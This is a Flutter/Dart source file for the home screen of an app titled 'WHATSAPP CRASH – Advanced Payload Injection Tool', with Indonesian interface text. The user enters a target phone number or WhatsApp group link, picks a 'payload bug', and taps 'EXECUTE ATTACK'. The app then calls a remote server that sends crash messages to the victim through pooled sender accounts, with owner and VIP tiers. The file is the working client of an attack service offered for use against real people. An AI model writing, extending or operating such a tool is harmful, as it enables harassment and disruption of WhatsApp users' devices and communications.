import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:provider/provider.dart';
import 'theme_provider.dart';
import 'sender_global.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _pulseController;
  VideoPlayerController? _videoController;
  String selectedBugId = "";

  String _selectedBugMode = "number";
  String _senderMode = "private";
  int _privateSenderCount = 0;
  int _globalSenderCount = 0;
  bool _isSending = false;
  bool _isVideoInitialized = false;

  static const Color _bgDeep = Color(0xFF000000);
  static const Color _bgCard = Color(0xFF0A0A0A);
  static const Color _bgSection = Color(0xFF050505);
  static const Color _red = Color(0xFFFF0040);
  static const Color _redDark = Color(0xFF8B0020);
  static const Color _border = Color(0xFF1A0A0A);
  static const Color _textMuted = Color(0xFF6B6B6B);
  static const Color _textSubtle = Color(0xFF3D3D3D);

  @override
  void initState() {
    super.initState();

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    _initVideo();

    if (widget.listBug.isNotEmpty) {
      final initialBugs = _getFilteredBugs();
      if (initialBugs.isNotEmpty) {
        selectedBugId = initialBugs[0]['bug_id'];
      }
    }

    _fetchSenderStats();
  }

  void _initVideo() async {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/bug.mp4');
      await _videoController!.initialize();
      _videoController!.setLooping(true);
      _videoController!.setVolume(0.0);
      await _videoController!.play();
      if (mounted) {
        setState(() {
          _isVideoInitialized = true;
        });
      }
    } catch (e) {
      debugPrint("Video init error: $e");
      if (mounted) {
        setState(() {
          _isVideoInitialized = false;
        });
      }
    }
  }

  List<Map<String, dynamic>> _getFilteredBugs() {
    if (_selectedBugMode == "group") {
      return widget.listBug.where((b) => b['bug_id'].contains('_group')).toList();
    } else {
      return widget.listBug.where((b) => !b['bug_id'].contains('_group')).toList();
    }
  }

  Future<void> _fetchSenderStats() async {
    try {
      final res = await http.get(Uri.parse(
          "http://private01.angkasanyabobo.my.id:1326/getSenderStats?key=${widget.sessionKey}"));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true) {
          setState(() {
            _privateSenderCount = data['private'] ?? 0;
            _globalSenderCount = data['global'] ?? 0;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching sender stats: $e");
    }
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _videoController?.dispose();
    targetController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (cleaned.length < 8) return null;
    return cleaned;
  }

  bool isValidGroupLink(String input) {
    return input.contains('chat.whatsapp.com') && input.contains('https://');
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    if (_selectedBugMode == "number") {
      final target = formatPhoneNumber(rawInput);
      if (target == null || key.isEmpty) {
        _showAlert("Invalid Number", "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert("Invalid Link", "Masukkan link group WA yang valid (contoh: https://chat.whatsapp.com/...).");
        return;
      }
    }

    final currentBugs = _getFilteredBugs();
    if (!currentBugs.any((b) => b['bug_id'] == selectedBugId)) {
      if (currentBugs.isNotEmpty) {
        setState(() { selectedBugId = currentBugs[0]['bug_id']; });
      } else {
        _showAlert("Error", "Tidak ada bug tersedia untuk mode ini.");
        return;
      }
    }

    setState(() { _isSending = true; });

    final effectiveSenderMode = (widget.role == 'owner' || widget.role == 'vip') ? _senderMode : 'private';

    try {
      final res = await http.get(Uri.parse(
          "http://private01.angkasanyabobo.my.id:1326/sendBug?key=$key&target=$rawInput&bug=$selectedBugId&senderMode=$effectiveSenderMode"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showAlert("⏳ Cooldown", "Tunggu beberapa saat sebelum mengirim lagi.");
      } else if (data["valid"] == false) {
        _showAlert("❌ Key Invalid", "Sesi Anda tidak valid. Silakan login ulang.");
      } else if (data["sended"] == false) {
        _showAlert("⚠️ Gagal", "Server sedang maintenance atau terjadi kegagalan.");
      } else {
        _showAlert("✅ Berhasil", "Bug sukses dikirim ke target!");
        targetController.clear();
        _fetchSenderStats();
      }
    } catch (_) {
      _showAlert("❌ Error", "Terjadi kesalahan pada sistem. Coba lagi nanti.");
    } finally {
      setState(() { _isSending = false; });
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.8),
      builder: (_) => AlertDialog(
        backgroundColor: _bgCard,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _red.withOpacity(0.25)),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(color: _red.withOpacity(0.12), borderRadius: BorderRadius.circular(10)),
              child: const Icon(Icons.info_outline, color: _red, size: 20),
            ),
            const SizedBox(width: 12),
            Flexible(
              child: Text(title, style: const TextStyle(color: _red, fontFamily: 'Orbitron', fontWeight: FontWeight.bold, fontSize: 14)),
            ),
          ],
        ),
        content: Text(msg, style: const TextStyle(color: _textMuted, fontFamily: 'ShareTechMono', fontSize: 13)),
        actions: [
          Container(
            decoration: BoxDecoration(color: _red.withOpacity(0.10), borderRadius: BorderRadius.circular(10), border: Border.all(color: _red.withOpacity(0.25))),
            child: TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text("OK", style: TextStyle(color: _red, fontFamily: 'Orbitron', fontWeight: FontWeight.bold, fontSize: 12)),
            ),
          ),
        ],
      ),
    );
  }

  void _openGlobalSender() {
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (_) => GlobalSenderPage(
          sessionKey: widget.sessionKey,
        ),
      ),
    );
  }

  Widget _buildTopHeader() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: _bgCard,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _red.withOpacity(0.25), width: 1.5),
        boxShadow: [
          BoxShadow(color: _red.withOpacity(0.08), blurRadius: 30, spreadRadius: 2),
        ],
        gradient: LinearGradient(colors: [_red.withOpacity(0.08), Colors.transparent], begin: Alignment.topLeft, end: Alignment.bottomRight),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: _red.withOpacity(0.15),
              shape: BoxShape.circle,
              border: Border.all(color: _red.withOpacity(0.5)),
              boxShadow: [BoxShadow(color: _red.withOpacity(0.2), blurRadius: 15, spreadRadius: 1)],
            ),
            child: const Icon(Icons.bug_report_outlined, color: _red, size: 28),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text("WHATSAPP CRASH", style: TextStyle(color: _red, fontFamily: 'Orbitron', fontWeight: FontWeight.w900, fontSize: 18, letterSpacing: 2)),
                const SizedBox(height: 6),
                Text("Advanced Payload Injection Tool", style: TextStyle(color: _textMuted, fontFamily: 'ShareTechMono', fontSize: 11, letterSpacing: 0.5)),
              ],
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(color: _red.withOpacity(0.10), borderRadius: BorderRadius.circular(20), border: Border.all(color: _red.withOpacity(0.3))),
            child: Text(widget.role.toUpperCase(), style: const TextStyle(color: _red, fontSize: 10, fontFamily: 'Orbitron', fontWeight: FontWeight.bold, letterSpacing: 1)),
          ),
        ],
      ),
    );
  }

  Widget _buildVideoBox() {
    return Container(
      height: 200,
      width: double.infinity,
      decoration: BoxDecoration(
        color: Colors.black,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _red.withOpacity(0.15), width: 1),
        boxShadow: [
          BoxShadow(color: _red.withOpacity(0.05), blurRadius: 20, spreadRadius: 0),
        ],
      ),
      clipBehavior: Clip.antiAlias,
      child: _isVideoInitialized && _videoController != null
          ? SizedBox(
              width: double.infinity,
              height: double.infinity,
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController!.value.size.width,
                  height: _videoController!.value.size.height,
                  child: VideoPlayer(_videoController!),
                ),
              ),
            )
          : Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.video_library_rounded, color: _textSubtle, size: 48),
                  const SizedBox(height: 8),
                  Text(
                    "Video tidak tersedia",
                    style: TextStyle(color: _textMuted, fontSize: 12),
                  ),
                ],
              ),
            ),
    );
  }

  Widget _buildModeSelector() {
    return Row(
      children: [
        Expanded(
          child: GestureDetector(
            onTap: () {
              setState(() {
                _selectedBugMode = "number";
                targetController.clear();
                final newBugs = _getFilteredBugs();
                if (newBugs.isNotEmpty) selectedBugId = newBugs[0]['bug_id'];
              });
            },
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 250),
              padding: const EdgeInsets.symmetric(vertical: 14),
              decoration: BoxDecoration(
                color: _selectedBugMode == "number" ? _red.withOpacity(0.08) : Colors.transparent,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _selectedBugMode == "number" ? _red.withOpacity(0.6) : _border, width: _selectedBugMode == "number" ? 1.5 : 1),
                boxShadow: _selectedBugMode == "number" ? [BoxShadow(color: _red.withOpacity(0.08), blurRadius: 12, spreadRadius: 0)] : [],
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.phone_android_rounded, color: _selectedBugMode == "number" ? _red : _textMuted, size: 18),
                  const SizedBox(width: 8),
                  Text("BUG NOMOR", style: TextStyle(color: _selectedBugMode == "number" ? _red : _textMuted, fontWeight: FontWeight.bold, fontSize: 13, fontFamily: 'ShareTechMono')),
                ],
              ),
            ),
          ),
        ),
        const SizedBox(width: 12),
        Expanded(
          child: GestureDetector(
            onTap: () {
              setState(() {
                _selectedBugMode = "group";
                targetController.clear();
                final newBugs = _getFilteredBugs();
                if (newBugs.isNotEmpty) selectedBugId = newBugs[0]['bug_id'];
              });
            },
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 250),
              padding: const EdgeInsets.symmetric(vertical: 14),
              decoration: BoxDecoration(
                color: _selectedBugMode == "group" ? _red.withOpacity(0.08) : Colors.transparent,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _selectedBugMode == "group" ? _red.withOpacity(0.6) : _border, width: _selectedBugMode == "group" ? 1.5 : 1),
                boxShadow: _selectedBugMode == "group" ? [BoxShadow(color: _red.withOpacity(0.08), blurRadius: 12, spreadRadius: 0)] : [],
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.group_add, color: _selectedBugMode == "group" ? _red : _textMuted, size: 18),
                  const SizedBox(width: 8),
                  Text("BUG GROUP", style: TextStyle(color: _selectedBugMode == "group" ? _red : _textMuted, fontWeight: FontWeight.bold, fontSize: 13, fontFamily: 'ShareTechMono')),
                ],
              ),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildSenderToggle() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: _bgCard, borderRadius: BorderRadius.circular(16), border: Border.all(color: _red.withOpacity(0.10))),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.swap_horiz_rounded, color: _red.withOpacity(0.7), size: 16),
              const SizedBox(width: 8),
              const Text("SENDER MODE", style: TextStyle(color: _red, fontWeight: FontWeight.bold, fontSize: 11, fontFamily: 'Orbitron', letterSpacing: 1.5)),
            ],
          ),
          const SizedBox(height: 12),
          Row(
            children: [
              Expanded(
                child: GestureDetector(
                  onTap: () => setState(() => _senderMode = 'private'),
                  child: AnimatedContainer(
                    duration: const Duration(milliseconds: 250),
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(
                      color: _senderMode == 'private' ? _red.withOpacity(0.08) : _bgSection,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _senderMode == 'private' ? _red.withOpacity(0.5) : _border, width: _senderMode == 'private' ? 1.5 : 1),
                    ),
                    child: Column(
                      children: [
                        Text("PRIVATE", style: TextStyle(color: _senderMode == 'private' ? _red : _textMuted, fontWeight: FontWeight.bold, fontSize: 12, fontFamily: 'ShareTechMono')),
                        const SizedBox(height: 4),
                        Text("$_privateSenderCount Active", style: TextStyle(color: _senderMode == 'private' ? Colors.white54 : _textSubtle, fontSize: 10)),
                      ],
                    ),
                  ),
                ),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: GestureDetector(
                  onTap: () => setState(() => _senderMode = 'global'),
                  child: AnimatedContainer(
                    duration: const Duration(milliseconds: 250),
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(
                      color: _senderMode == 'global' ? _red.withOpacity(0.08) : _bgSection,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _senderMode == 'global' ? _red.withOpacity(0.5) : _border, width: _senderMode == 'global' ? 1.5 : 1),
                    ),
                    child: Column(
                      children: [
                        Text("GLOBAL", style: TextStyle(color: _senderMode == 'global' ? _red : _textMuted, fontWeight: FontWeight.bold, fontSize: 12, fontFamily: 'ShareTechMono')),
                        const SizedBox(height: 4),
                        Text("$_globalSenderCount Active", style: TextStyle(color: _senderMode == 'global' ? Colors.white54 : _textSubtle, fontSize: 10)),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildInputPanel() {
    final availableBugs = _getFilteredBugs();

    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(color: _bgCard, borderRadius: BorderRadius.circular(20), border: Border.all(color: _red.withOpacity(0.10))),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _buildModeSelector(),
          const SizedBox(height: 24),
          Padding(
            padding: const EdgeInsets.only(left: 4, bottom: 8),
            child: Text(
              _selectedBugMode == "number" ? "TARGET NUMBER" : "WHATSAPP GROUP LINK",
              style: const TextStyle(color: _red, fontWeight: FontWeight.bold, fontSize: 11, fontFamily: 'Orbitron', letterSpacing: 1.5),
            ),
          ),
          TextField(
            controller: targetController,
            style: const TextStyle(color: Colors.white, fontSize: 15),
            cursorColor: _red,
            keyboardType: _selectedBugMode == "number" ? TextInputType.phone : TextInputType.url,
            decoration: InputDecoration(
              hintText: _selectedBugMode == "number" ? "e.g. +628xxxxxxxx" : "e.g. https://chat.whatsapp.com/...",
              hintStyle: const TextStyle(color: _textSubtle, fontSize: 13),
              filled: true,
              fillColor: _bgSection,
              border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide(color: _border)),
              enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide(color: _border)),
              focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide(color: _red.withOpacity(0.5), width: 1.5)),
              prefixIcon: Icon(_selectedBugMode == "number" ? Icons.phone_android_rounded : Icons.link, color: _red.withOpacity(0.5)),
              contentPadding: const EdgeInsets.symmetric(vertical: 16, horizontal: 20),
            ),
          ),
          const SizedBox(height: 22),
          if (availableBugs.isNotEmpty) ...[
            const Padding(
              padding: EdgeInsets.only(left: 4, bottom: 8),
              child: Text("SELECT PAYLOAD BUG", style: TextStyle(color: _red, fontWeight: FontWeight.bold, fontSize: 11, fontFamily: 'Orbitron', letterSpacing: 1.5)),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 4),
              decoration: BoxDecoration(color: _bgSection, borderRadius: BorderRadius.circular(14), border: Border.all(color: _border)),
              child: DropdownButtonHideUnderline(
                child: DropdownButton<String>(
                  dropdownColor: _bgSection,
                  value: selectedBugId.isNotEmpty ? selectedBugId : null,
                  isExpanded: true,
                  icon: Icon(Icons.arrow_drop_down, color: _red.withOpacity(0.5)),
                  iconSize: 28,
                  style: const TextStyle(color: Colors.white, fontSize: 14, fontFamily: 'ShareTechMono'),
                  items: availableBugs.map((bug) {
                    return DropdownMenuItem<String>(
                      value: bug['bug_id'],
                      child: Text(bug['bug_name'] ?? bug['bug_id']),
                    );
                  }).toList(),
                  onChanged: (value) {
                    setState(() {
                      selectedBugId = value ?? "";
                    });
                  },
                ),
              ),
            ),
          ] else ...[
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(color: _bgSection, borderRadius: BorderRadius.circular(14), border: Border.all(color: _border)),
              child: Center(
                child: Text("Tidak ada bug tersedia.", style: TextStyle(color: _textMuted, fontSize: 13)),
              ),
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildSendButton() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, child) {
        return Container(
          height: 58,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: _red.withOpacity(0.5), width: 1.5),
            boxShadow: [
              BoxShadow(
                color: _red.withOpacity(_isSending ? 0 : 0.15),
                blurRadius: _pulseController.value * 15,
                spreadRadius: _pulseController.value * 0.5,
              ),
            ],
          ),
          child: ElevatedButton(
            onPressed: _isSending ? null : _sendBug,
            style: ElevatedButton.styleFrom(
              backgroundColor: _isSending ? _bgSection : _red,
              foregroundColor: _isSending ? _textMuted : Colors.white,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
              elevation: 0,
              padding: const EdgeInsets.symmetric(vertical: 16),
            ),
            child: _isSending
                ? Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      const SizedBox(
                        width: 20,
                        height: 20,
                        child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2),
                      ),
                      const SizedBox(width: 12),
                      Text(
                        "SENDING...",
                        style: TextStyle(color: Colors.white, fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, letterSpacing: 1.5),
                      ),
                    ],
                  )
                : Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      const Icon(Icons.bolt, size: 20, color: Colors.white),
                      const SizedBox(width: 10),
                      const Text(
                        "EXECUTE ATTACK",
                        style: TextStyle(color: Colors.white, fontFamily: 'Orbitron', fontSize: 15, fontWeight: FontWeight.w900, letterSpacing: 2),
                      ),
                    ],
                  ),
          ),
        );
      },
    );
  }

  Widget _buildGlobalSenderButton() {
    return GestureDetector(
      onTap: _openGlobalSender,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        decoration: BoxDecoration(
          color: _bgCard,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: _red.withOpacity(0.15)),
          boxShadow: [
            BoxShadow(
              color: _red.withOpacity(0.05),
              blurRadius: 12,
              spreadRadius: 0,
            ),
          ],
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: _red.withOpacity(0.1),
                borderRadius: BorderRadius.circular(12),
              ),
              child: const Icon(Icons.public_rounded, color: _red, size: 22),
            ),
            const SizedBox(width: 14),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    "GLOBAL SENDER",
                    style: TextStyle(
                      color: Colors.white,
                      fontFamily: 'Orbitron',
                      fontSize: 13,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1,
                    ),
                  ),
                  Text(
                    "Manage & pair global senders",
                    style: TextStyle(
                      color: _textMuted,
                      fontSize: 11,
                      fontFamily: 'ShareTechMono',
                    ),
                  ),
                ],
              ),
            ),
            Icon(
              Icons.chevron_right_rounded,
              color: _red.withOpacity(0.5),
              size: 20,
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bgDeep,
      body: SafeArea(
        child: SingleChildScrollView(
          physics: const BouncingScrollPhysics(),
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              _buildTopHeader(),
              const SizedBox(height: 16),
              _buildVideoBox(),
              const SizedBox(height: 16),
              _buildInputPanel(),
              const SizedBox(height: 16),
              if (widget.role == 'owner' || widget.role == 'vip') ...[
                _buildSenderToggle(),
                const SizedBox(height: 16),
              ],
              _buildSendButton(),
              const SizedBox(height: 16),
              _buildGlobalSenderButton(),
              const SizedBox(height: 20),
            ],
          ),
        ),
      ),
    );
  }
}